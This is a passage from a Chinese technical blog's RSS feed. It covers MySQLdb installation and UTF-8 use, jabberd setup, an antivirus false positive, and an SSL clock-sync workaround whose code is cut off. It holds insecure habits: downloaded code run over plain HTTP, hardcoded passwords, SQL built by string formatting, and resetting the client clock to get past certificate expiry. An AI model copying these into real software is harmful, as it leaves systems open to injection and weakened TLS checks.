<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span> (cdr (image-size (image-get-di<span style="text-decoration: underline;">splay-property) t))))))</span>
</pre>
</div>

<dl class="org-dl">
<dt>效果如下</dt><dd></dd>
</dl>
<pre class="example">
[(Image[png](181*415))]
</pre>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[在python中安装mysqldb模块]]></title>
            <link>/article/5728-python-4e2d5b8988c5-mysqldb-6a215757.html</link>
            <guid>/article/5728-python-4e2d5b8988c5-mysqldb-6a215757.html</guid>
            <pubDate>Wed, 01 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-orgad19eb4" class="outline-2">
<h2 id="orgad19eb4">正常的安装过程</h2>
<div class="outline-text-2" id="text-orgad19eb4">
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #969896; background-color: #22a224a427a7;"> </span> wget <span style="color: #8abeb7;">"http://downloads.sourceforge.net/project/mysql-python/mysql-python\</span>
<span style="color: #8abeb7;">/1.2.3/MySQL-python-1.2.3.tar.gz?r=http%3A%2F%2Fsourceforge.net%2Fprojects\</span>
<span style="color: #8abeb7;">%2Fmysql-python%2Ffiles%2F&amp;ts=1304062611&amp;use_mirror=nchc"</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> tar xzvf MySQL-python-1.2.3.tar.gz
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b294bb;">cd</span> MySQL-python-1.2.3
<span style="color: #969896; background-color: #22a224a427a7;"> </span> python setup.py build
<span style="color: #969896; background-color: #22a224a427a7;"> </span> python setup.py install
</pre>
</div>
</div>
</div>

<div id="outline-container-orgf7c5871" class="outline-2">
<h2 id="orgf7c5871">常见错误及其修复</h2>
<div class="outline-text-2" id="text-orgf7c5871">
<ul class="org-ul">
<li><p>
ImportError: No module named setuptools
</p>
<div class="org-src-container">
<pre class="src src-sh" id="org6d38cfe">wget http://pypi.python.org/packages/2.4/s/setuptools/setuptools-0.6c11-py2.4.eg<span style="text-decoration: underline;">g</span><span style="color: #8abeb7; text-decoration: underline;">\</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">md5=bd639f9b0eac4c42497034dec2ec0c2b</span>
sh setuptools-0.6c11-py2.4.egg
</pre>
</div></li>

<li><p>
mysql_config: command not found
</p>
<div class="org-src-container">
<pre class="src src-sh" id="org4d400a1">sed --in-place -e <span style="color: #8abeb7;">"s/#mysql_config = \/usr\/local\/bin\/mysql_config/\</span>
<span style="color: #8abeb7;">mysql_config = \/usr\/local\/mysql\/bin\/mysql_config/g"</span> site.cfg
</pre>
</div></li>

<li><p>
ImportError: &hellip; _mysql.so: undefined symbol: compress
</p>
<div class="org-src-container">
<pre class="src src-sh" id="org6b99fef">sed --in-place -e <span style="color: #8abeb7;">"s/libs = mysql_config(\"libs_r\")/libs = mysql_config(\"libs_</span><span style="color: #8abeb7; text-decoration: underline;">r\")\n\</span>
<span style="color: #8abeb7;">libs.append('-lz')\n        print libs/g"</span> setup_posix.py
</pre>
</div></li>
</ul>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[解决360杀毒报网页HTML.Rce.Gen3恶意程序的问题]]></title>
            <link>/article/89e351b3-360-67406bd262a57f519875-html.rce.gen3-6076610f7a0b5e8f768495ee9898.html</link>
            <guid>/article/89e351b3-360-67406bd262a57f519875-html.rce.gen3-6076610f7a0b5e8f768495ee9898.html</guid>
            <pubDate>Wed, 01 Aug 2012 00:55:00 GMT</pubDate>
            <content:encoded><![CDATA[
<div id="outline-container-org1be3018" class="outline-2">
<h2 id="org1be3018">问题描述</h2>
<div class="outline-text-2" id="text-org1be3018">
<p>
测试发现在某些机器上会弹出360杀毒危险警告对话框，导致网页无法打开。
</p>
</div>
</div>

<div id="outline-container-org9f3034d" class="outline-2">
<h2 id="org9f3034d">解决方法</h2>
<div class="outline-text-2" id="text-org9f3034d">
<p>
将嵌入的统计js脚本从&lt;/html&gt;标签后移到里面去。
</p>
<ul class="org-ul">
<li>修改前</li>
</ul>
<div class="org-src-container">
<pre class="src src-html">...
&lt;/<span style="color: #de935f;">body</span>&gt;
&lt;/<span style="color: #de935f;">html</span>&gt;
&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">"text/javascript"</span>&gt;document.write(unescape(<span style="color: #8abeb7;">"%3Cscript%20...%3C/script%3E"</span>));&lt;/<span style="color: #de935f;">script</span>&gt;
</pre>
</div>
<ul class="org-ul">
<li>修改后</li>
</ul>
<div class="org-src-container">
<pre class="src src-html">...
&lt;<span style="color: #de935f;">script</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">"text/javascript"</span>&gt;document.write(unescape(<span style="color: #8abeb7;">"%3Cscript%20...%3C/script%3E"</span>));&lt;/<span style="color: #de935f;">script</span>&gt;
&lt;/<span style="color: #de935f;">body</span>&gt;
&lt;/<span style="color: #de935f;">html</span>&gt;
</pre>
</div>
</div>
</div>

<div id="outline-container-org59d19d7" class="outline-2">
<h2 id="org59d19d7">心得</h2>
<div class="outline-text-2" id="text-org59d19d7">
<p>
以后再遇到这种情况，可以采取排除法，将网页另存为本地文件，一点点的删除内容直到360杀毒不再报警为止。</p>
</div>
</div>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[搭建jabber服务器]]></title>
            <link>/article/642d5efa-jabber-670d52a15668.html</link>
            <guid>/article/642d5efa-jabber-670d52a15668.html</guid>
            <pubDate>Tue, 03 May 2011 16:32:00 GMT</pubDate>
            <content:encoded><![CDATA[<ul class="org-ul">
<li><p>
编译安装
</p>

<p>
<code>下载</code>
</p>
<div class="org-src-container">
<pre class="src src-sh">wget http://download.jabberd.org/jabberd14/jabberd14-1.6.1.1.tar.gz
tar xzvf jabberd14-1.6.1.1.tar.gz
<span style="color: #b294bb;">cd</span> jabberd14-1.6.1.1
</pre>
</div>

<p>
<code>修改代码以解决编译错误</code>
</p>
<div class="org-src-container">
<pre class="src src-sh">diff -r jabberd14-1.6.1.1/jabberd/lib/xmlnode.cc tmp/jabberd14-1.6.1.1/jabberd/l<span style="text-decoration: underline;">ib/xmlnode.cc</span>
882,884c882,884
&lt;     const char *next_step = NULL;
&lt;     const char *start_predicate = NULL;
&lt;     const char *end_predicate = NULL;
---
&gt;     char *next_step = NULL;
&gt;     char *start_predicate = NULL;
&gt;     char *end_predicate = NULL;
1836c1836
&lt;         ((char*)strchr(lang, <span style="color: #8abeb7;">'-'</span>))[0] = 0;
---
&gt;         strchr(lang, <span style="color: #8abeb7;">'-'</span>)[0] = 0;
diff -r jabberd14-1.6.1.1/jabberd/log.cc tmp/jabberd14-1.6.1.1/jabberd/log.cc
89c89
&lt;         pos = (char*)strchr(zone,<span style="color: #8abeb7;">'.'</span>);
---
&gt;     pos = strchr(zone,<span style="color: #8abeb7;">'.'</span>);
diff -r jabberd14-1.6.1.1/jabberd/mio_tls.cc tmp/jabberd14-1.6.1.1/jabberd/mio_t<span style="text-decoration: underline;">ls.cc</span>
615c615
&lt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style="text-decoration: underline;">file, privfile, GNUTLS_OPENPGP_FMT_BASE64);</span>
---
&gt;         ret = gnutls_certificate_set_openpgp_key_file(current_credentials, pub<span style="text-decoration: underline;">file, privfile);</span>
634c634
&lt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style="text-decoration: underline;"> file, GNUTLS_OPENPGP_FMT_BASE64);</span>
---
&gt;         ret = gnutls_certificate_set_openpgp_keyring_file(current_credentials,<span style="text-decoration: underline;"> file);</span>
640a641,657
&gt;     }
&gt;
&gt;     // load GnuPG trustdb
&gt;     if (j_strcmp(xmlnode_get_localname(cur), <span style="color: #8abeb7;">"trustdb"</span>) == 0) {
&gt;         char const *const file = xmlnode_get_data(cur);
&gt;
&gt;         if (file == NULL) {
&gt;         log_warn(NULL, <span style="color: #8abeb7;">"Initializing TLS subsystem: &lt;trustdb/&gt; element inside </span><span style="color: #8abeb7; text-decoration: underline;">the TLS configuration, that does not contain a file-name."</span><span style="text-decoration: underline;">);</span>
&gt;         continue;
&gt;         }
&gt;
&gt;         // load the GnuPG trustdb
&gt;         ret = gnutls_certificate_set_openpgp_trustdb(current_credentials, file<span style="text-decoration: underline;">);</span>
&gt;         if (ret &lt; 0) {
&gt;         log_error(NULL, <span style="color: #8abeb7;">"Error loading GnuPG trustdb %s: %s"</span>, file, gnutls_str<span style="text-decoration: underline;">error(ret));</span>
&gt;         continue;
&gt;         }
</pre>
</div>

<p>
<code>编译安装</code>
</p>
<div class="org-src-container">
<pre class="src src-sh">./configure &amp;&amp; make &amp;&amp; sudo make install
</pre>
</div>

<p>
如出错通常是少了相关依赖库，用包管理工具（如：ubuntu下的新立得）安装即可。
</p></li>

<li><p>
配置
</p>

<p>
按照mysql.sql中的注释配置数据库：
</p>

<div class="org-src-container">
<pre class="src src-sh">mysql -uroot -p
mysql&gt; CREATE DATABASE jabber CHARACTER SET utf8;
mysql&gt; use jabber;
mysql&gt; grant all on jabber.* to jabber@localhost identified by <span style="color: #8abeb7;">'secret'</span>;
mysql&gt; <span style="color: #8abeb7;">\.</span> mysql.sql
</pre>
</div></li>

<li><p>
运行
</p>

<div class="org-src-container">
<pre class="src src-sh">sudo jabberd -h localhost -B
</pre>
</div></li>

<li><p>
注册用户1
</p>

<div class="org-src-container">
<pre class="src src-sh">telnet localhost 5222
&lt;stream:stream
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'localhost'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:client'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> xmlns:<span style="color: #f0c674;">stream</span>=<span style="color: #8abeb7;">'http://etherx.jabber.org/streams'</span>&gt;

&lt;iq <span style="color: #f0c674;">id</span>=<span style="color: #8abeb7;">'reg1'</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">'set'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;query <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:iq:register'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;username&gt;jack&lt;/username&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;password&gt;jack&lt;/password&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;name&gt;jack&lt;/name&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;email&gt;&lt;/email&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;/query&gt;
&lt;/iq&gt;

&lt;/stream:stream&gt;
</pre>
</div></li>

<li><p>
登录用户1
</p>

<pre class="example">
Empathy菜单-&gt;编辑-&gt;帐户-&gt;添加：
协议: Jabber
登录ID: jack@localhost
记住密码
密码: jack
登录
</pre></li>

<li><p>
注册用户2
</p>

<div class="org-src-container">
<pre class="src src-sh">telnet localhost 5222
&lt;stream:stream
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'localhost'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:client'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> xmlns:<span style="color: #f0c674;">stream</span>=<span style="color: #8abeb7;">'http://etherx.jabber.org/streams'</span>&gt;

&lt;iq <span style="color: #f0c674;">id</span>=<span style="color: #8abeb7;">'reg1'</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">'set'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;query <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:iq:register'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;username&gt;rose&lt;/username&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;password&gt;rose&lt;/password&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;name&gt;rose&lt;/name&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;email&gt;&lt;/email&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;/query&gt;
&lt;/iq&gt;

&lt;/stream:stream&gt;
</pre>
</div></li>

<li><p>
用户1加用户2为联系人
</p>

<pre class="example">
Empathy菜单-&gt;聊天-&gt;添加联系人:
帐户：jack@localhost
标识符: rose@localhost
添加
</pre></li>

<li><p>
登录用户2，并发一个消息给用户1
</p>

<div class="org-src-container">
<pre class="src src-sh">telnet localhost 5222
&lt;stream:stream
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'localhost'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:client'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> xmlns:<span style="color: #f0c674;">stream</span>=<span style="color: #8abeb7;">'http://etherx.jabber.org/streams'</span>&gt;

&lt;iq <span style="color: #f0c674;">id</span>=<span style="color: #8abeb7;">'auth1'</span> <span style="color: #f0c674;">type</span>=<span style="color: #8abeb7;">'set'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;query <span style="color: #f0c674;">xmlns</span>=<span style="color: #8abeb7;">'jabber:iq:auth'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;username&gt;rose&lt;/username&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;password&gt;rose&lt;/password&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   &lt;resource&gt;test&lt;/resource&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;/query&gt;
&lt;/iq&gt;

&lt;presence/&gt;

&lt;message <span style="color: #f0c674;">to</span>=<span style="color: #8abeb7;">'jack@localhost'</span>&gt;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> &lt;body&gt;hello, jack&lt;/body&gt;
&lt;/message&gt;

&lt;/stream:stream&gt;
</pre>
</div></li>
</ul>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[python中MySQLdb使用utf-8字符集]]></title>
            <link>/article/python-4e2d-mysqldb-4f7f7528-utf-8-5b577b2696c6.html</link>
            <guid>/article/python-4e2d-mysqldb-4f7f7528-utf-8-5b577b2696c6.html</guid>
            <pubDate>Thu, 28 Apr 2011 17:22:00 GMT</pubDate>
            <content:encoded><![CDATA[<dl class="org-dl">
<dt>要避免乱码需要做好以下几点</dt><dd><ul class="org-ul">
<li>python源代码保存为utf-8</li>
<li>数据库建成utf-8</li>
<li>mysql连接设置为utf-8</li>
<li>查询結果中的文本字段是unicode的，转回utf-8</li>
</ul></dd>

<dt>总结性的示例代码</dt><dd><div class="org-src-container">
<pre class="src src-python"><span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">!/usr/bin/env python</span>
<span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">-*- coding: utf-8 -*-</span>

<span style="color: #b5bd68;">import</span> MySQLdb

<span style="color: #b5bd68;">if</span> <span style="color: #b294bb;">__name__</span> == <span style="color: #8abeb7;">'__main__'</span>:
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">mysql</span> = MySQLdb.connect(host=<span style="color: #8abeb7;">'localhost'</span>, user=<span style="color: #8abeb7;">'root'</span>, passwd=<span style="color: #8abeb7;">'123456'</span>, char<span style="text-decoration: underline;">set=</span><span style="color: #8abeb7; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">)</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">cursor</span> = mysql.cursor()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(<span style="color: #8abeb7;">'SET NAMES UTF8'</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'DROP DATABASE IF EXISTS mysqldb_utf8_test'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(sql)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'CREATE DATABASE mysqldb_utf8_test DEFAULT CHARACTER SET utf8 COLLATE </span><span style="color: #8abeb7; text-decoration: underline;">utf8_general_ci'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(sql)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">mysql</span> = MySQLdb.connect(host=<span style="color: #8abeb7;">'localhost'</span>, user=<span style="color: #8abeb7;">'root'</span>, passwd=<span style="color: #8abeb7;">'123456'</span>, db=<span style="color: #8abeb7;">'</span><span style="color: #8abeb7; text-decoration: underline;">mysqldb_utf8_test'</span><span style="text-decoration: underline;">, charset=</span><span style="color: #8abeb7; text-decoration: underline;">'utf8'</span><span style="text-decoration: underline;">)</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">cursor</span> = mysql.cursor()
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(<span style="color: #8abeb7;">'SET NAMES UTF8'</span>)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'CREATE TABLE utf8_table(key_field VARCHAR(32) NOT NULL, value_field V</span><span style="color: #8abeb7; text-decoration: underline;">ARCHAR(255) NOT NULL)'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(sql)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">key</span> = <span style="color: #8abeb7;">'tangxinfa'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">value</span> = <span style="color: #8abeb7;">'&#22909;&#20154;&#19968;&#20010;'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'INSERT INTO utf8_table VALUES("%s", "%s")'</span>%(key, value)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(sql)       <span style="color: #969896; font-style: italic;">#</span><span style="color: #969896; font-style: italic;">&#27880;&#24847;&#26576;&#20123;&#26087;&#29256;&#26412;&#30340;mysql&#65288;&#22914;4.1.22&#20197;&#19979;&#65289;&#65292;mysql.character_set_name</span><span style="color: #969896; font-style: italic; text-decoration: underline;">()&#24635;&#26159;&#36820;&#22238;latin1&#65292;&#20250;&#24341;&#36215;&#20081;&#30721;&#65292;&#38656;&#35201;&#25913;&#20026;cursor.execute('INSERT INTO utf8_table VALUES("%s", "%s")', (key, value))</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #f0c674;">sql</span> = <span style="color: #8abeb7;">'select * from utf8_table'</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   cursor.execute(sql)
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span> record <span style="color: #b5bd68;">in</span> cursor.fetchall():
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">for</span> item <span style="color: #b5bd68;">in</span> record:
<span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #969896; background-color: #22a224a427a7;"> </span>   <span style="color: #b5bd68;">print</span> item.encode(<span style="color: #8abeb7;">'utf8'</span>)
</pre>
</div></dd>

<dt>参考</dt><dd><ul class="org-ul">
<li><a href="http://mysql-python.sourceforge.net/MySQLdb.html">http://mysql-python.sourceforge.net/MySQLdb.html</a></li>
<li><a href="http://bbs.phpchina.com/viewthread.php?tid=13861">http://bbs.phpchina.com/viewthread.php?tid=13861</a></li>
<li><a href="http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html">http://hi.baidu.com/ak456/blog/item/c318502394aa20569922ed7b.html</a></li>
</ul></dd>
</dl>
]]></content:encoded>
        </item>
        <item>
            <title><![CDATA[SSL双方系统时间不一致导致的SSL连接失败及其解决方案]]></title>
            <link>/article/ssl-53cc65b97cfb7edf65f695f44e0d4e0081f45bfc81f47684-ssl-8fde63a559318d2553ca517689e351b365b96848.html</link>
            <guid>/article/ssl-53cc65b97cfb7edf65f695f44e0d4e0081f45bfc81f47684-ssl-8fde63a559318d2553ca517689e351b365b96848.html</guid>
            <pubDate>Fri, 25 Jul 2008 09:45:00 GMT</pubDate>
            <content:encoded><![CDATA[<p>
在产品使用中，实施人员常常报告服务器与客户端无法连接，最终查明原因是双方的时间设置不一致。OpenSSL证书有一个有效时间段，当客户端或服务器的系统时间不在这个时间段内时SSL会因证书验证失败而无法连接。在实施中系统时间错误是很常见的，因不能上网而未开时间自动同步、bios没电了、客户疏忽等原因都会导致系统时间设置错误。如果连接失败后再查看系统时间设置进行故障排查终归是一件麻烦的事情。
</p>

<p>
解决这个问题有以下几个办法：
</p>

<ul class="org-ul">
<li><p>
将证书的有效期设置得够大（如：1970-2099）
</p>

<p>
这样估计可以在一定程度上解决这个问题，不过这也是个馊主意，一般申请的证书总会有一个合理的有效期。
</p></li>

<li><p>
检测及必要时自动同步客户端与服务器的时间
</p>

<p>
通过用wireshake抓包分析SSL建立连接的过程，发现在SSL握手过程中，会向对方传送本机的系统时间。因此一个显而易见的办法就是，当连接过程中检测到证书过期，将客户端的时间同步为服务器端的时间，再重连即可。
</p>

<p>
下面是具体的示例代码：
</p>
<div class="org-src-container">
<pre class="src src-c"><span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/ssl.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/bio.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;openssl/err.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;winsock2.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;stdio.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;string.h&gt;</span>
<span style="color: #b294bb;">#include</span> <span style="color: #8abeb7;">&lt;time.h&gt;</span>

<span style="color: #b5bd68;">typedef</span> <span style="color: #b5bd68;">struct</span> <span style="color: #81a2be;">_TimeInfo</span>
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">time_t</span> <span style="color: #f0c674;">client</span>;  <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">&#23458;&#25143;&#31471;&#30340;&#26102;&#38388;</span><span style="color: #969896; font-style: italic;">*/</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">time_t</span> <span style="color: #f0c674;">server</span>;  <span style="color: #969896; font-style: italic;">/*</span><span style="color: #969896; font-style: italic;">&#26381;&#21153;&#22120;&#30340;&#26102;&#38388;</span><span style="color: #969896; font-style: italic;">*/</span>
} <span style="color: #81a2be;">TimeInfo</span>;

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* &#21516;&#27493;&#31995;&#32479;&#26102;&#38388;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">BOOL</span> <span style="color: #de935f;">syncSystemTime</span>(<span style="color: #81a2be;">time_t</span> <span style="color: #f0c674;">t</span>)
{
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">SYSTEMTIME</span> <span style="color: #f0c674;">st</span>;
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">FILETIME</span>   <span style="color: #f0c674;">ft</span>;<span style="color: #373b41; background-color: #de935f;">  </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #81a2be;">LONGLONG</span>   <span style="color: #f0c674;">ll</span>;<span style="color: #373b41; background-color: #de935f;">  </span>

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ll = Int32x32To64(t, 10000000) + 116444736000000000; <span style="color: #969896; font-style: italic;">//</span><span style="color: #969896; font-style: italic;">1970.01.01</span><span style="color: #373b41; background-color: #de935f;">  </span>

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ft.dwLowDateTime  = (<span style="color: #81a2be;">DWORD</span>)ll;<span style="color: #373b41; background-color: #de935f;">  </span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> ft.dwHighDateTime = (<span style="color: #81a2be;">DWORD</span>)(ll &gt;&gt; 32);<span style="color: #373b41; background-color: #de935f;">  </span>

<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #b5bd68;">return</span> FileTimeToSystemTime(&amp;ft, &amp;st) &amp;&amp; SetSystemTime(&amp;st);
}

<span style="color: #b294bb;">/**</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">* &#33719;&#21462;SSL&#25569;&#25163;&#36807;&#31243;&#20013;&#26381;&#21153;&#22120;&#19982;&#23458;&#25143;&#31471;&#21452;&#26041;&#30340;&#31995;&#32479;&#26102;&#38388;.</span>
<span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #b294bb;">*/</span>
<span style="color: #81a2be;">void</span> <span style="color: #de935f;">getSSLHandleShakeTimeInfo</span>(<span style="color: #81a2be;">int</span> <span style="color: #f0c674;">write_p</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #81a2be;">int</span> <span style="color: #f0c674;">version</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span><span style="color: #81a2be;">int</span> <span style="color: #f0c674;">content_type</span>,
<span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: #969896; background-color: #22a224a427a7;"> </span> <span style="color: 